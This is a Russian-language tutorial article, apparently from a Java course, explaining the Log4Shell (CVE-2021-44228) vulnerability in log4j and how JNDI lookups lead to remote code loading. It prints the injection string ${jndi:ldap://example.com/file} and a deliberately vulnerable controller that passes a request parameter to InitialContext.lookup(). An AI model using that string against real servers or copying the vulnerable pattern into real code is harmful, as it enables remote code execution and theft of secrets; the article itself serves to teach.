Log4Shell уязвимость
<p>----------------------------------------</p>
Скандал
Масштаб катастрофы
Самая серьёзная уязвимость в истории
Суть уязвимости
Слишком умная библиотека
<p>----------------------------------------</p>
<h2>7.1 Скандал</h2>
<p>И конечно же нельзя не рассказать об истории, которая произошла совсем недавно – в конце 2021 года.</p>
<img data-max-width="512" data-id="238b7e58-5875-420a-9102-a56730053634" src="https://cdn.javarush.com/images/article/238b7e58-5875-420a-9102-a56730053634/512.jpeg" alt="Log4Shell ">
<p>Агентство по кибербезопасности и защите инфраструктуры США (CISA) заявило, что проблема <code>Log4Shell</code> является одной из самых серьезных уязвимостей в истории. Да, речь идет о нашей любимой библиотеке <code>log4j</code>.</p>
<p>Наша уютненькая маленькая библиотека <code>log4j</code> <strong>и самая серьезная уязвимость в истории</strong>? Заинтриговал? Тогда слушайте.</p>
<h2>7.2 Масштаб катастрофы</h2>
<p>Об обнаружении критической уязвимости <code>Log4Shell</code> (код CVE-2021-44228) сообщили 9 декабря 2021 года специалисты по безопасности компании Lunasec.  Специалисты из Java-сообщества Apache Security Team проверили эту информацию и опубликовали список уязвимых Java-библиотек. Список был просто огромным.</p>
<p>Если Java-проект использовал библиотеку <code>log4j</code>, то его можно было достаточно легко взломать. А учитывая что почти весь серверный софт пишется на <code>Java</code> и <code>log4j</code> самый популярный java-логгер, то по данным безопасников, уязвимость затронула 93% корпоративных облачных сред. Включая такие как Amazon AWS, Microsoft Azure, Google Cloud, Cloudflare, iCloud, Minecraft, Steam и многие другие</p>
<p>Более того, уязвимость затронула не только серверный софт, но и многие Java-приложения, а также производителей аппаратного обеспечения. Например, Intel опубликовала список из 32 программ, подверженных взлому: SDK, системы обслуживания серверов, Linux-инструменты.</p>
<p>Так же компания Nvidia выложила отчёт о проблемах с безопасностью c упоминанием серверов DGX и инструментов NetQ. Ряд обновлений срочно выпустили Apple и Microsoft.</p>
<p><span class="text-red">Грубо говоря, одна строчка в адресной строке браузера у школьника кладёт сервер, если эту строчку скушает логгер</span>(на многих серверах записываются в логи все <code>HTTP-запросы</code>).</p>
<p>После анализа кода оказалось, что уязвимость в библиотеке сидела с 2013 года, но заметили только сейчас. А когда начали копать глубже, то обнаружили пропасть, дно которой не просматривается вообще.</p>
<h2>7.3 Самая серьезная уязвимость в истории</h2>
<p>Еще в декабре 2021 года Агентство по кибербезопасности и защите инфраструктуры США (CISA) <a href="https://www.techradar.com/news/log4j-could-be-the-most-serious-threat-ever-seen-cisa-head-warns" target="_blank">заявило</a>, что <strong><code>Log4Shell</code> является одной из самых серьёзных уязвимостей в истории</strong>.</p>
<p>Многие другие специалисты высказывают <a href="https://www.wired.com/story/log4j-log4shell-vulnerability-ransomware-second-wave/" target="_blank">аналогичное мнение</a>. Об этой уязвимости знают все, и хакеры всех возрастов уже используют ее для краж персональных данных и других видов атак на различные организации. В будущем нас ждет волна массовых взломов и утечек данных.</p>
<p>Масштаб катастрофы можно оценить даже по тому факту, что существует <a href="https://log4jmemes.com/" target="_blank">отдельный сайт с мемами про Log4j</a>, и каждый день там новые картинки.</p>
<img data-max-width="512" data-id="03e8d5ad-be1e-4b20-bfbb-3f432e694eea" src="https://cdn.javarush.com/images/article/03e8d5ad-be1e-4b20-bfbb-3f432e694eea/512.jpeg" alt="">
<p>Эта проблема с нами надолго. Дыра в безопасности в миллионах, если не сотнях миллионов компьютерных систем. Весь старый софт нужно обновить и как минимум заменить там эту библиотеку. А ведь в большинстве случаем никто даже не знает, какие библиотеки и каких версий используются в их софте.</p>
<p>В общем, ждем резкого роста зарплат специалистов по компьютерной безопасности.</p>
<h2>7.4 Суть уязвимости</h2>
<p>Чтобы понять суть уязвимости, нужно понять как устроены большие серверные системы. Зачастую такие серверные приложения разбиты на различные сервисы, которые находятся на разных серверах. И взаимодействовать им помогает сервис JNDI.</p>
<p><strong>Java Naming and Directory Interface (JNDI)</strong> — это <code>Java API</code>, чтобы искать объекты/сервисы по имени. Эти объекты могут храниться в различных службах именования или каталогах, таких как Remote Method Invocation (RMI), Common Object Request Broker Architecture (CORBA), Lightweight Directory Access Protocol (LDAP) или Domain Name Service (DNS).</p>
<p>Работать с ним очень просто — это простой <code>Java API</code>, который принимает всего один строковый параметр – имя сервиса. С его помощью можно обратиться к любому сервису и попросить его что-то сделать и/или прислать какие-нибудь данные. Например, строка <code>${jndi:ldap://example.com/file}</code> загрузит данные с этого <code>URL</code>, указанного в строке.</p>
<p><span class="text-red">Если параметр поступает из ненадёжного источника, это может привести к удалённой загрузке классов и исполнению стороннего кода</span>. Что и происходит в случае с <code>Log4j</code>. Злоумышленник просто направляет Java-приложение жертвы на вредоносный <code>rmi/ldap/corba-сервер</code> и получает в ответ вредоносный объект.</p>
<p>Технически проблема тут не в самой <code>log4j</code> библиотеке, а в настройках безопасности при работе с <code>JNDI-сервисом</code>. Всегда нужно проверять, что за строку передаем в <code>InitialContext.lookup()</code>.</p>
<p>Пример уязвимого <code>JNDI-приложения</code>:</p>
<pre class='line-numbers'><code>
<span class="text-green">@RequestMapping("/lookup")
@Example(uri = {"/lookup?name=java:comp/env"})</span>
public Object lookup(<span class="text-green">@RequestParam</span> String name) throws Exception{
   return new javax.naming.InitialContext().lookup(name);
}
</code></pre>
<h2>7.5 Слишком умная библиотека</h2>
<p>И причем тут <code>log4j</code> спросите вы? Все дело в том, что ее разработчики захотели сделать работу с ней максимально комфортной и добавили в нее умное логирование. Вот как оно работает:</p>
<p>Началось все с того, что сообщения лога позволяли задать шаблон, куда выполнялась подстановка данных, пример:</p>
<pre><code>
log.debug(<span class="text-green">“User {user} has {count} friends”</span>, user, count);
</code></pre>
<p>Старый вариант без подстановки данных выглядел так:</p>
<pre><code>
log.debug( <span class="text-green">“User “+</span>user <span class="text-green">+” has “+</span> count <span class="text-green">+” friends”</span>);
</code></pre>
<p>В 2013 году в библиотеку добавили еще и подстановку умных префиксов, заданных шаблоном вида <code>${prefix:name}</code>. Например строка <code><span class="text-green">“${java:version}”</span></code> при выводе будет преобразована в <code><span class="text-green">«Java version 1.7.0_67»</span></code>. Ой как удобно.</p>
<p>Среди распознанных выражений есть <code>${jndi:&lt;lookup&gt;}</code>, где после протокола jndi можно указать поиск через <code>LDAP</code>: произвольный <code>URL-адрес</code> может быть запрошен и загружен как данные объекта <code>Java</code>.</p>
<p>Это стандартная проблема подхода всей <code>JDK</code>: она автоматически десериализует объект, ссылку на который можно задать в виде урла. При этом с удалённого ресурса загружается не только данные объекта, но и код его класса.</p>
<p>Взлом выглядит так:</p>
<ul>
    <li>Загружается файл с вредоносным кодом</li>
    <li>Файл содержит сериализованный <code>Java объект</code> (и его класс)</li>
    <li>Класс загружается <code>Java-машиной</code></li>
    <li>Создается объект вредоносного класса</li>
    <li>Вызывается конструктор объекта</li>
    <li>И конструктор, и статическая инициализация позволяет выполнить код вредоносного класса</li>
</ul>
<p>Если в строке, которую логирует <code>log4j</code> встретиться что-то типа <code>${jndi:ldap://example.com/file}</code>, то <span class="text-red"><code>log4j</code> загрузит данные с этого <code>URL-адреса</code> при подключении к Интернету</span>. Вводя строку, которая логируется, злоумышленник может загрузить и выполнить вредоносный код, размещенный на общедоступном <code>URL-адресе</code>.</p>
<p>Даже если выполнение данных отключено, злоумышленник может получить данные, такие как секретные переменные среды, путем размещения их в <code>URL-адресе</code>, в котором они будут заменены и отправлены на сервер злоумышленника.</p>
<p>Хорошая новость: <strong>проблему в библиотеке быстро исправили</strong>.</p>
<p>Плохая новость: <span class="text-red">миллионы серверов продолжают работать по всему миру со старой версией этой библиотеки</span>…</p>
